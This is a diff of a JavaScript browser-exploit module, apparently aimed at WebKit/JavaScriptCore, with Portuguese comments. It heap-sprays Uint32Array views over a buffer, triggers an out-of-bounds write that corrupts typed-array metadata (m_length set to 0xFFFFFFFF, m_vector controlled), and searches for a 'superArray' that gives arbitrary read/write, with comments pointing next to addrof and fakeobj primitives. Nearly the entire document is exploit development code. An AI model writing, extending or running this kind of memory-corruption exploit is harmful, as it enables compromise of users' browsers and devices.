@@ -4,174 +4,203 @@ import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
     oob_array_buffer_real,
-    oob_dataview_real,
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs'; // Removido WEBKIT_LIBRARY_INFO por enquanto
+import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-const FNAME_TRUE_LOG_REPLICATION = "trueLogReplication_v29a";
+// ============================================================
+// DEFINIÇÕES DE CONSTANTES GLOBAIS DO MÓDULO
+// ============================================================
+const CORRUPTION_OFFSET_TRIGGER = 0x70;
+const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const TARGET_WRITE_OFFSET_0x6C = 0x6C; // Afetado pela escrita em 0x70
 
-// === Constantes baseadas no seu Log.txt [00:51:23] (investigateControl_v7) ===
-const OOB_OFFSET_0x68 = 0x68;
-const OOB_OFFSET_0x6C = 0x6C;
-const OOB_OFFSET_0x70_TRIGGER = 0x70;
+// !!!!! IMPORTANTE: SUBSTITUA ESTE VALOR PELO STRUCTUREID REAL DE UM Uint32Array NA SUA PLATAFORMA !!!!!
+const EXPECTED_UINT32ARRAY_STRUCTURE_ID = 0xBADBAD00 | 27; // PLACEHOLDER ÓBVIO - PRECISA SER SUBSTITUÍDO
 
-// Valores INICIAIS plantados no oob_buffer ANTES do trigger
-const INITIAL_VAL_AT_0x68 = new AdvancedInt64(0x11223344, 0xAABBCCDD); // aabbccdd_11223344
-const INITIAL_VAL_AT_0x6C = new AdvancedInt64(0xFFFFFFFF, 0xEEEEFFFF); // eeeeffff_ffffffff
-
-const TRIGGER_VALUE_AT_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
-
-// Valores ESPERADOS no oob_buffer APÓS o trigger, conforme seu Log.txt
-const EXPECTED_OOB_VAL_AT_0x68_AFTER = new AdvancedInt64(0xAABBCCDD, 0x11223344); // 0x11223344_aabbccdd
-const EXPECTED_OOB_VAL_AT_0x6C_AFTER = new AdvancedInt64(0x11223344, 0xFFFFFFFF); // 0xffffffff_11223344
-const EXPECTED_OOB_QWORD_AT_0x70_AFTER = TRIGGER_VALUE_AT_0x70;
-
-// Metadados esperados para o SuperArray (se um objeto JS for corrompido)
-// O m_vector viria do valor em oob_buffer[0x68] APÓS o trigger.
-// O m_length viria do LOW_DWORD do valor em oob_buffer[0x70] APÓS o trigger.
-const EXPECTED_SUPERARRAY_M_VECTOR = EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER;
-const EXPECTED_SUPERARRAY_M_LENGTH = EXPECTED_OOB_QWORD_AT_0x70_AFTER.low(); // Deve ser 0xFFFFFFFF
-
-const NUM_SPRAY_OBJECTS = 500; // Mantenha ou ajuste
-const ORIGINAL_SPRAY_LENGTH = 8;
-
-const MARKER_TO_VALIDATE_SUPERARRAY = 0xACEACE00;
-const MARKER_OFFSET_IN_OOB_DATA_TARGET = 0x0; // Plantar no início do buffer alvo do superArray
-
-let sprayedVictimObjects = [];
-
-// Função principal que será chamada
+// ============================================================
+// FUNÇÃO DE INVESTIGAÇÃO (v8 - Spray de Views sobre oob_array_buffer_real)
+// ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_TRUE_LOG_REPLICATION}: Replicação Fiel do Log [00:51:23] ---`, "test", FNAME_TRUE_LOG_REPLICATION);
-    sprayedVictimObjects = [];
+    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v8_Views";
+    logS3(`--- Iniciando Investigação (v8.1): Spray de Views e Identificação ---`, "test", FNAME_SPRAY_INVESTIGATE);
+
+    const NUM_SPRAY_OBJECTS = 200;
+    const SPRAY_VIEW_BYTE_LENGTH = 32; // Cada Uint32Array(8) ocupa 32 bytes.
+    const SPRAY_VIEW_ELEMENT_COUNT = SPRAY_VIEW_BYTE_LENGTH / 4; // 8 elementos para Uint32Array
+
+    // Offset dentro do oob_array_buffer_real onde tentaremos colocar/encontrar o início de uma View pulverizada.
+    // Este é o local onde o JSCell header da view estaria.
+    const TARGET_VIEW_METADATA_OFFSET_IN_OOB = 0x58; // Seu offset promissor
+
+    // Valores para plantar e tentar zerar m_vector do objeto hipotético em TARGET_VIEW_METADATA_OFFSET_IN_OOB
+    const PLANT_MVECTOR_LOW_PART  = 0x00000000;
+    const PLANT_MVECTOR_HIGH_PART = 0x00000000;
+
+    let sprayedVictimViews = [];
+    let superArray = null;
 
     try {
         await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) {
-            logS3("Falha OOB Init", "critical", FNAME_TRUE_LOG_REPLICATION);
-            return;
+        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
+            throw new Error("OOB Init ou primitivas R/W falharam.");
         }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_TRUE_LOG_REPLICATION);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);
+        logS3(`   AVISO IMPORTANTE: Usando StructureID esperado para Uint32Array: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}. SUBSTITUA PELO VALOR CORRETO!`, "warn", FNAME_SPRAY_INVESTIGATE);
 
-        // FASE 1: Spray de Uint32Array
-        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_TRUE_LOG_REPLICATION);
+
+        // 1. Heap Spraying: Criar views sobre o oob_array_buffer_real
+        //    O objetivo é que os *objetos de metadados* dessas views (JSCells, JSObject, ArrayBufferView)
+        //    sejam alocados na heap de uma forma que um deles caia no TARGET_VIEW_METADATA_OFFSET_IN_OOB.
+        //    Os dados das views já estão no oob_array_buffer_real.
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array como views sobre oob_array_buffer_real...`, "info", FNAME_SPRAY_INVESTIGATE);
+        let current_view_offset_in_oob = OOB_CONFIG.BASE_OFFSET_IN_DV + 0x100; // Começa a criar views após uma certa margem
         for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
-            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
-            u32arr[0] = 0xEFEFEF00 ^ i;
-            sprayedVictimObjects.push(u32arr);
-        }
-        logS3("Pulverização concluída.", "good", FNAME_TRUE_LOG_REPLICATION);
-
-        // FASE 2: Plantar valores INICIAIS no oob_array_buffer_real
-        logS3(`FASE 2: Plantando valores iniciais no oob_buffer (PRÉ-TRIGGER) conforme Log [00:51:23]...`, "info", FNAME_TRUE_LOG_REPLICATION);
-        oob_write_absolute(OOB_OFFSET_0x68, INITIAL_VAL_AT_0x68, 8);
-        oob_write_absolute(OOB_OFFSET_0x6C, INITIAL_VAL_AT_0x6C, 8);
-
-        logS3("  Valores NO OOB_BUFFER ANTES do trigger:", "info", FNAME_TRUE_LOG_REPLICATION);
-        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${oob_read_absolute(OOB_OFFSET_0x68, 8).toString(true)} (Plantado: ${INITIAL_VAL_AT_0x68.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
-        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${oob_read_absolute(OOB_OFFSET_0x6C, 8).toString(true)} (Plantado: ${INITIAL_VAL_AT_0x6C.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
-        // O valor em 0x70 antes do trigger seria o HIGH DWORD de INITIAL_VAL_AT_0x6C (0xEEEEFFFF) + LOW DWORD do QWORD seguinte.
-        // Não é crucial logar isso, pois será sobrescrito.
-
-        // FASE 3: Trigger OOB principal
-        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] com ${TRIGGER_VALUE_AT_0x70.toString(true)}...`, "info", FNAME_TRUE_LOG_REPLICATION);
-        oob_write_absolute(OOB_OFFSET_0x70_TRIGGER, TRIGGER_VALUE_AT_0x70, 8);
-        logS3("Escrita OOB de trigger realizada.", "good", FNAME_TRUE_LOG_REPLICATION);
-        
-        // Verificar os valores NO OOB_BUFFER após o trigger, para ver se bate com seu log de sucesso
-        const val_0x68_in_oob_after = oob_read_absolute(OOB_OFFSET_0x68, 8); 
-        const val_0x6C_in_oob_after = oob_read_absolute(OOB_OFFSET_0x6C, 8); 
-        const val_0x70_qword_in_oob_after = oob_read_absolute(OOB_OFFSET_0x70_TRIGGER, 8);
-        
-        logS3(`  Valores NO OOB_BUFFER APÓS trigger (para comparação com Log [00:51:23]):`, "info", FNAME_TRUE_LOG_REPLICATION);
-        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x68)}] = ${val_0x68_in_oob_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
-        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x6C)}] = ${val_0x6C_in_oob_after.toString(true)} (Seu Log Esperava: ${EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER.toString(true)})`, "info", FNAME_TRUE_LOG_REPLICATION);
-        logS3(`    oob_buffer[${toHex(OOB_OFFSET_0x70_TRIGGER)}] (QWORD) = ${val_0x70_qword_in_oob_after.toString(true)} (Seu Log Esperava LOW_DWORD ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})`, "info", FNAME_TRUE_LOG_REPLICATION);
-
-        let oob_dynamics_replicated = val_0x68_in_oob_after.equals(EXPECTED_OOB_VAL_AT_0x68_AFTER_TRIGGER) &&
-                                     val_0x6C_in_oob_after.equals(EXPECTED_OOB_VAL_AT_0x6C_AFTER_TRIGGER) &&
-                                     val_0x70_qword_in_oob_after.low() === EXPECTED_SUPERARRAY_M_LENGTH;
-
-        if (oob_dynamics_replicated) {
-            logS3("    !!!! Dinâmica de bytes no oob_buffer APÓS trigger CORRESPONDE ao seu Log de Sucesso [00:51:23] !!!!", "vuln", FNAME_TRUE_LOG_REPLICATION);
-            document.title = "OOB DINÂMICA REPLICADA!";
-        } else {
-            logS3("    AVISO: Dinâmica de bytes no oob_buffer após trigger NÃO corresponde ao seu Log de Sucesso [00:51:23].", "warn", FNAME_TRUE_LOG_REPLICATION);
-            document.title = "OOB Dinâmica DIFERENTE";
-            // Mesmo que não corresponda EXATAMENTE, ainda tentaremos encontrar o superArray pelo length.
-        }
-        await PAUSE_S3(300);
-
-        // FASE 4: Identificar SuperArray (pelo length)
-        logS3(`FASE 4: Tentando identificar SuperArray (pelo length ${toHex(EXPECTED_SUPERARRAY_M_LENGTH)})...`, "info", FNAME_TRUE_LOG_REPLICATION);
-        let superArray = null;
-        let superArrayIndex = -1;
-
-        for (let i = 0; i < sprayedVictimObjects.length; i++) {
-            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_SUPERARRAY_M_LENGTH) {
-                superArray = sprayedVictimObjects[i];
-                superArrayIndex = i;
-                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_TRUE_LOG_REPLICATION);
-                document.title = `SUPERARRAY Idx ${i}! Len OK!`;
-                break; 
+            if (current_view_offset_in_oob + SPRAY_VIEW_BYTE_LENGTH > oob_array_buffer_real.byteLength) {
+                logS3(`   Spray interrompido em ${i} views, oob_array_buffer_real muito pequeno para mais.`, "warn", FNAME_SPRAY_INVESTIGATE);
+                break;
             }
-        }
-
-        if (superArray) {
-            logS3(`  SuperArray obtido. O m_vector do objeto JS corrompido DEVERIA ser ${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} (o valor que apareceu em oob_buffer[0x68] após trigger).`, "info", FNAME_TRUE_LOG_REPLICATION);
-            logS3(`  Este m_vector (${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)}) não é 0x0.`, "info", FNAME_TRUE_LOG_REPLICATION);
-            logS3(`  Testando se este m_vector permite ler/escrever no oob_array_buffer_real (assumindo que m_vector agora aponta para o dataPointer do oob_buffer)...`, "info", FNAME_TRUE_LOG_REPLICATION);
-
-            // Plantar um marcador no INÍCIO dos dados do oob_array_buffer_real via oob_write_absolute
-            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA_TARGET, MARKER_TO_VALIDATE_SUPERARRAY, 4);
-            logS3(`    Marcador ${toHex(MARKER_TO_VALIDATE_SUPERARRAY)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA_TARGET)}] (via oob_write).`, "info", FNAME_TRUE_LOG_REPLICATION);
-            
-            // Se o m_vector do superArray (que esperamos ser EXPECTED_SUPERARRAY_M_VECTOR)
-            // realmente se tornou o dataPointer para o oob_array_buffer_real (ou uma cópia dele),
-            // então superArray[MARKER_OFFSET_IN_OOB_DATA_TARGET / 4] deveria ler nosso marcador.
-            const index_to_read_marker_in_superarray = MARKER_OFFSET_IN_OOB_DATA_TARGET / 4;
-            
             try {
-                const value_read_via_superarray = superArray[index_to_read_marker_in_superarray];
-                logS3(`    SuperArray[${toHex(index_to_read_marker_in_superarray)}] leu: ${toHex(value_read_via_superarray)}`, "leak", FNAME_TRUE_LOG_REPLICATION);
-                
-                if (value_read_via_superarray === MARKER_TO_VALIDATE_SUPERARRAY) {
-                    logS3(`      !!!! SUCESSO !!!! SuperArray com m_vector=${EXPECTED_SUPERARRAY_M_VECTOR.toString(true)} PARECE MAPEADO para o oob_array_buffer_real!`, "vuln", FNAME_TRUE_LOG_REPLICATION);
-                    document.title = "SUPERARRAY R/W FUNCIONAL!";
-                    // AQUI TEMOS UMA PRIMITIVA PODEROSA: R/W sobre oob_array_buffer_real com tamanho gigante.
-                    // Próximo passo: Usar para construir addrof e fakeobj.
-                    // Exemplo: Tentar escrever com o superArray e ler de volta com oob_read_absolute
-                    const test_write_val_super = 0xBADDB00D;
-                    superArray[index_to_read_marker_in_superarray + 1] = test_write_val_super; // Escrever no próximo DWORD
-                    const check_val_in_oob = oob_read_absolute(MARKER_OFFSET_IN_OOB_DATA_TARGET + 4, 4);
-                    if (check_val_in_oob === test_write_val_super) {
-                        logS3(`        Verificação de escrita do SuperArray no oob_buffer bem-sucedida!`, "vuln", FNAME_TRUE_LOG_REPLICATION);
-                    } else {
-                         logS3(`        Falha na verificação de escrita do SuperArray no oob_buffer. Lido ${toHex(check_val_in_oob)}.`, "error", FNAME_TRUE_LOG_REPLICATION);
-                    }
+                let view = new Uint32Array(oob_array_buffer_real, current_view_offset_in_oob, SPRAY_VIEW_ELEMENT_COUNT);
+                view[0] = (0xFACE0000 | i); // Marcador nos dados da view
+                sprayedVictimViews.push(view);
+                current_view_offset_in_oob += SPRAY_VIEW_BYTE_LENGTH; // Avança para a próxima fatia do buffer
+            } catch (e_spray) {
+                logS3(`   Erro ao criar view no spray ${i} no offset ${toHex(current_view_offset_in_oob)}: ${e_spray.message}`, "error", FNAME_SPRAY_INVESTIGATE);
+                break;
+            }
+        }
+        logS3(`Pulverização de ${sprayedVictimViews.length} views concluída.`, "info", FNAME_SPRAY_INVESTIGATE);
+        await PAUSE_S3(200);
 
-                } else {
-                    logS3(`      Falha na verificação do marcador. SuperArray não parece mapear para o oob_array_buffer_real como esperado. (Lido ${toHex(value_read_via_superarray)} vs Marcador ${toHex(MARKER_TO_VALIDATE_SUPERARRAY)})`, "error", FNAME_TRUE_LOG_REPLICATION);
-                    document.title = "SuperArray Mapeamento Falhou";
+        // 2. Verificar StructureID em TARGET_VIEW_METADATA_OFFSET_IN_OOB *antes* da corrupção principal
+        //    Isso nos diz se o spray provavelmente colocou os metadados de uma view lá.
+        let sid_before_corruption = 0;
+        try {
+            sid_before_corruption = oob_read_absolute(TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, 4);
+            logS3(`FASE 2: StructureID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} ANTES da corrupção principal: ${toHex(sid_before_corruption)}`, "info", FNAME_SPRAY_INVESTIGATE);
+            if (sid_before_corruption === EXPECTED_UINT32ARRAY_STRUCTURE_ID) {
+                logS3("    BOA NOTÍCIA: StructureID esperado encontrado ANTES da corrupção principal!", "good", FNAME_SPRAY_INVESTIGATE);
+            } else {
+                logS3(`    AVISO: StructureID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} (${toHex(sid_before_corruption)}) não é o esperado (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}).`, "warn", FNAME_SPRAY_INVESTIGATE);
+            }
+        } catch (e) {
+            logS3(`   Erro ao ler StructureID pré-corrupção em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
+        }
+
+
+        // 3. Preparar e Plantar valores para m_vector e 0x6C
+        //    O alvo é o objeto cujos metadados estão em TARGET_VIEW_METADATA_OFFSET_IN_OOB (0x58)
+        const m_vector_low_addr_in_oob = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
+        const m_vector_high_addr_in_oob = m_vector_low_addr_in_oob + 4; // 0x58 + 0x10 + 0x4 = 0x6C
+
+        // Garantir que o TARGET_WRITE_OFFSET_0x6C (onde a corrupção acontece) é o mesmo que m_vector_high_addr_in_oob
+        if (TARGET_WRITE_OFFSET_0x6C !== m_vector_high_addr_in_oob) {
+            logS3(`ALERTA DE CONFIGURAÇÃO: TARGET_WRITE_OFFSET_0x6C (${toHex(TARGET_WRITE_OFFSET_0x6C)}) não é igual ao esperado m_vector_high_addr_in_oob (${toHex(m_vector_high_addr_in_oob)})!`, "critical", FNAME_SPRAY_INVESTIGATE);
+            // Você pode querer parar aqui se esta condição não for atendida, pois a lógica de corrupção não funcionará como planejado.
+        }
+
+        logS3(`FASE 3.1: Plantando valores para m_vector do objeto em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}:`, "info", FNAME_SPRAY_INVESTIGATE);
+        oob_write_absolute(m_vector_low_addr_in_oob, PLANT_MVECTOR_LOW_PART, 4);
+        logS3(`  Plantado ${toHex(PLANT_MVECTOR_LOW_PART)} em ${toHex(m_vector_low_addr_in_oob)} (para m_vector low).`, "info", FNAME_SPRAY_INVESTIGATE);
+
+        oob_write_absolute(m_vector_high_addr_in_oob, PLANT_MVECTOR_HIGH_PART, 4);
+        oob_write_absolute(m_vector_high_addr_in_oob + 4, 0x0, 4); // Zera o que seria a parte alta de 0x6C / início de 0x70
+        logS3(`  Plantado ${toHex(PLANT_MVECTOR_HIGH_PART)} na parte baixa de ${toHex(m_vector_high_addr_in_oob)} (para m_vector high).`, "info", FNAME_SPRAY_INVESTIGATE);
+        logS3(`  QWORD @${toHex(m_vector_low_addr_in_oob)} (m_vector) ANTES do trigger: ${oob_read_absolute(m_vector_low_addr_in_oob, 8).toString(true)} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_SPRAY_INVESTIGATE);
+
+        // 4. Acionar a Corrupção Principal
+        logS3(`FASE 3.2: Acionando corrupção em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
+        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+
+        // 5. Fase de Pós-Corrupção: Ler metadados e tentar identificar/usar o array
+        logS3(`FASE 4: Investigando o offset ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} APÓS corrupção...`, "info", FNAME_SPRAY_INVESTIGATE);
+
+        let sid_after_corruption, abv_vector_after, abv_length_after, abv_mode_after;
+        const vec_offset_in_oob = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+        const len_offset_in_oob = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        const mode_offset_in_oob = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;
+
+        try { sid_after_corruption = oob_read_absolute(TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, 4); } catch(e){}
+        try { abv_vector_after = oob_read_absolute(vec_offset_in_oob, 8); } catch(e) {}
+        try { abv_length_after = oob_read_absolute(len_offset_in_oob, 4); } catch(e) {}
+        try { abv_mode_after = oob_read_absolute(mode_offset_in_oob, 4); } catch(e) {}
+
+        logS3(`    Resultados para metadados em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} APÓS corrupção:`, "info", FNAME_SPRAY_INVESTIGATE);
+        logS3(`      StructureID (@${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}): ${toHex(sid_after_corruption)} (Antes: ${toHex(sid_before_corruption)}, Esperado: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)})`, "leak", FNAME_SPRAY_INVESTIGATE);
+        logS3(`      m_vector    (@${toHex(vec_offset_in_oob)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"} (Controlado para: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_SPRAY_INVESTIGATE);
+        logS3(`      m_length    (@${toHex(len_offset_in_oob)}): ${toHex(abv_length_after)} (Decimal: ${abv_length_after})`, "leak", FNAME_SPRAY_INVESTIGATE);
+        logS3(`      m_mode      (@${toHex(mode_offset_in_oob)}): ${toHex(abv_mode_after)}`, "leak", FNAME_SPRAY_INVESTIGATE);
+
+        if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
+            isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === PLANT_MVECTOR_LOW_PART && abv_vector_after.high() === PLANT_MVECTOR_HIGH_PART) {
+            logS3(`    !!!! SUCESSO NA CORRUPÇÃO DE METADADOS EM ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      m_length CORROMPIDO para 0xFFFFFFFF!`, "vuln", FNAME_SPRAY_INVESTIGATE);
+            logS3(`      m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_SPRAY_INVESTIGATE);
+            document.title = `Spray: m_vec=${abv_vector_after.toString(true)}, m_len=FFFFFFFF`;
+
+            if (sid_after_corruption === EXPECTED_UINT32ARRAY_STRUCTURE_ID) {
+                logS3("        EXCELENTE: StructureID PÓS-CORRUPÇÃO corresponde ao esperado! Um Uint32Array real foi atingido!", "vuln", FNAME_SPRAY_INVESTIGATE);
+            } else {
+                logS3("        AVISO: StructureID PÓS-CORRUPÇÃO NÃO corresponde. Pode ser arriscado usar as views JS.", "warn", FNAME_SPRAY_INVESTIGATE);
+            }
+
+            if (abv_vector_after.low() === 0 && abv_vector_after.high() === 0) {
+                logS3("    m_vector é ZERO. Tentando identificar qual objeto JS (View) foi corrompido...", "warn", FNAME_SPRAY_INVESTIGATE);
+                const MARKER_VALUE_TO_WRITE = 0xABCD1234;
+                const MARKER_TEST_OFFSET_IN_OOB_BUFFER = 0x20; // Um offset diferente para o marcador
+                const MARKER_TEST_INDEX_IN_U32_ARRAY = MARKER_TEST_OFFSET_IN_OOB_BUFFER / 4;
+
+                let original_value_at_marker_offset = 0;
+                try { original_value_at_marker_offset = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, 4); } catch(e){}
+
+                oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, MARKER_VALUE_TO_WRITE, 4);
+                logS3(`    Marcador ${toHex(MARKER_VALUE_TO_WRITE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB_BUFFER)}] via oob_write.`, "info", FNAME_SPRAY_INVESTIGATE);
+
+                for (let i = 0; i < sprayedVictimViews.length; i++) {
+                    try {
+                        if (sprayedVictimViews[i][MARKER_TEST_INDEX_IN_U32_ARRAY] === MARKER_VALUE_TO_WRITE) {
+                            logS3(`      !!!! SUPER ARRAY (VIEW) ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador inicial: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_SPRAY_INVESTIGATE);
+                            logS3(`        Confirmado lendo o marcador ${toHex(MARKER_VALUE_TO_WRITE)} no índice ${MARKER_TEST_INDEX_IN_U32_ARRAY}.`, "vuln", FNAME_SPRAY_INVESTIGATE);
+                            superArray = sprayedVictimViews[i];
+                            document.title = `SUPER VIEW[${i}] VIVA!`;
+
+                            // Teste de Leitura/Escrita com o superArray
+                            const test_rw_idx = MARKER_TEST_INDEX_IN_U32_ARRAY + 1; // Outro índice
+                            const test_rw_val = 0x98765432;
+                            logS3(`        Testando R/W com superArray: superArray[${test_rw_idx}] = ${toHex(test_rw_val)}`, "info", FNAME_SPRAY_INVESTIGATE);
+                            superArray[test_rw_idx] = test_rw_val;
+                            const read_back_val = oob_read_absolute(test_rw_idx * 4, 4);
+                            if (read_back_val === test_rw_val) {
+                                logS3(`          SUCESSO R/W: Lido ${toHex(read_back_val)} de oob_buffer[${toHex(test_rw_idx*4)}]`, "good", FNAME_SPRAY_INVESTIGATE);
+                            } else {
+                                logS3(`          FALHA R/W: Lido ${toHex(read_back_val)}, esperado ${toHex(test_rw_val)}`, "error", FNAME_SPRAY_INVESTIGATE);
+                            }
+                            break;
+                        }
+                    } catch (e_access) { /* Ignora */ }
                 }
-            } catch (e) {
-                 logS3(`    Erro ao tentar usar SuperArray para ler/escrever marcador: ${e.message}`, "error", FNAME_TRUE_LOG_REPLICATION);
-                 document.title = "SuperArray Erro R/W Marcador";
+                try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB_BUFFER, original_value_at_marker_offset, 4); } catch(e){}
+                if (superArray) {
+                    logS3("    Primitiva de Leitura/Escrita Arbitrária (sobre oob_buffer) via 'superArray' (View) confirmada!", "vuln", FNAME_SPRAY_INVESTIGATE);
+                } else {
+                    logS3("    Não foi possível identificar a 'superArray' (View) específica. A corrupção dos metadados em memória é o principal achado.", "warn", FNAME_SPRAY_INVESTIGATE);
+                }
             }
         } else {
-            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_TRUE_LOG_REPLICATION);
-            document.title = "SuperArray NÃO Encontrado (v29a)";
+            logS3(`    Falha em corromper m_length ou controlar m_vector como esperado no offset ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}.`, "error", FNAME_SPRAY_INVESTIGATE);
         }
+        logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_TRUE_LOG_REPLICATION}: ${e.message}`, "critical", FNAME_TRUE_LOG_REPLICATION);
-        document.title = `${FNAME_TRUE_LOG_REPLICATION} FALHOU!`;
+        logS3(`ERRO CRÍTICO na investigação com spray: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
+        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
+        document.title = "Spray & Investigate FALHOU!";
     } finally {
-        sprayedVictimObjects = [];
+        sprayedVictimViews = [];
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_TRUE_LOG_REPLICATION} Concluído ---`, "test", FNAME_TRUE_LOG_REPLICATION);
+        logS3("--- Investigação com Spray (v8.1) Concluída ---", "test", FNAME_SPRAY_INVESTIGATE);
     }
 }
